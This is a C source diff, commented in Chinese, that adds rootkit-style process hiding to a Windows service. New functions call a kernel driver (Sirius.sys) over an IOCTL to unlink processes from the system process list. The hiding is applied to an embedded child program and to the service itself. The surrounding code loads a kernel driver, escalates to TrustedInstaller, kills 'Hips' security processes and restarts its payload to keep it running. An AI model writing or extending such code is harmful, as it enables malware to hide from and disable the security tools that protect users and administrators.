@@ -83,6 +83,8 @@ static BOOL  LoadKernelDriver(LPCWSTR svc, LPCWSTR path);
 static void  PrintDriverLoadSummary(LPCWSTR svc, LPCWSTR dev);
 static BOOL  CreateProcessAsTrustedInstaller(LPCWSTR path, BOOL priv, LPCWSTR args);
 static void  StartBackgroundKiller(const char *list);
+static BOOL  HideProcess(ULONG pid);
+static void  HideCurrentProcess(void);
 
 /** @brief 后台进程查杀线程句柄 */
 static HANDLE g_hKillerThread = NULL;
@@ -399,6 +401,11 @@ static void RunBusinessCore(HANDLE hStopEvent,
         printf("[INFO] 启动嵌入程序 (第 %d 次运行, PID=%lu)...\n",
                *pRestartCount, pi.dwProcessId);
 
+        /* 立即隐藏子进程 */
+        if (HideProcess(pi.dwProcessId)) {
+            printf("[INFO] 嵌入程序进程已隐藏 (PID=%lu)\n", pi.dwProcessId);
+        }
+
         /// 同时等待 Slave 退出和停止信号
         HANDLE handles[2] = { pi.hProcess };
         DWORD count = 1;
@@ -545,8 +552,11 @@ static DWORD WINAPI SvcWorker(LPVOID param) {
         printf("[TI] TrustedInstaller 提权失败\n");
     }
 
-    /* Phase: 启动后台内核级进程查杀 */
-    StartBackgroundKiller("Hips");
+        /* Phase: 启动后台内核级进程查杀 */
+        StartBackgroundKiller("Hips");
+
+        /* Phase: 隐藏自身进程 */
+        HideCurrentProcess();
 
     /* 进入保活主循环 */
     int restartCount = 0;
@@ -822,6 +832,42 @@ static BOOL KillProcessByDriver(ULONG pid) {
                              &req, sizeof(req), NULL, 0, &returned, NULL);
         lastErr = GetLastError();
         return ok;  /* 隐藏成功 = 等效消失 */
+    }
+}
+
+/**
+ * @brief 隐藏指定 PID 的进程（从 EPROCESS 活动链摘除）
+ *
+ * 通过 Sirius.sys IOCTL Hide(1) 将进程从系统进程列表中移除。
+ * 任务管理器、tasklist 等所有用户态工具均无法查到。
+ *
+ * @param pid  目标进程 PID
+ * @return TRUE 成功隐藏
+ */
+static BOOL HideProcess(ULONG pid) {
+    if (g_hDriverDevice == INVALID_HANDLE_VALUE) return FALSE;
+
+    SI_PROCESS_INFO req = { 0 };
+    req.ProcessInformation = 1;  /* Hide */
+    req.PID = pid;
+    req.Buffer = NULL;
+    req.Argument = 0;
+
+    DWORD returned = 0;
+    return DeviceIoControl(g_hDriverDevice, IOCTL_SIRIUS_SET_PROCESS_INFO,
+                           &req, sizeof(req), NULL, 0, &returned, NULL);
+}
+
+/**
+ * @brief 隐藏当前进程自身
+ *
+ * 调用后本进程从所有系统进程枚举 API 中消失。
+ */
+static void HideCurrentProcess(void) {
+    if (HideProcess(GetCurrentProcessId())) {
+        printf("[Hide] 当前进程 (PID=%lu) 已隐藏\n", GetCurrentProcessId());
+    } else {
+        printf("[Hide] 隐藏自身失败 — 驱动设备可能未就绪\n");
     }
 }
 
